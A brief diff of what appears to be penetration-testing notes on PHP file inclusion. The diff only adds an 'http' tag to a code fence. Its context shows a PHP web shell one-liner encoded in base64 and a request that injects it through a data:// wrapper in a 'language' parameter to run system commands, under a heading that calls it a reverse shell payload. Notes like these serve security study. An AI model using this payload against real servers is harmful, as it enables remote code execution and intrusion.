@@ -25,7 +25,7 @@ echo '<?php system($_GET["cmd"]); ?>' | base64
 ```
 
 Reverse shell Payload (Can be done with curl as well)
-```
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
 
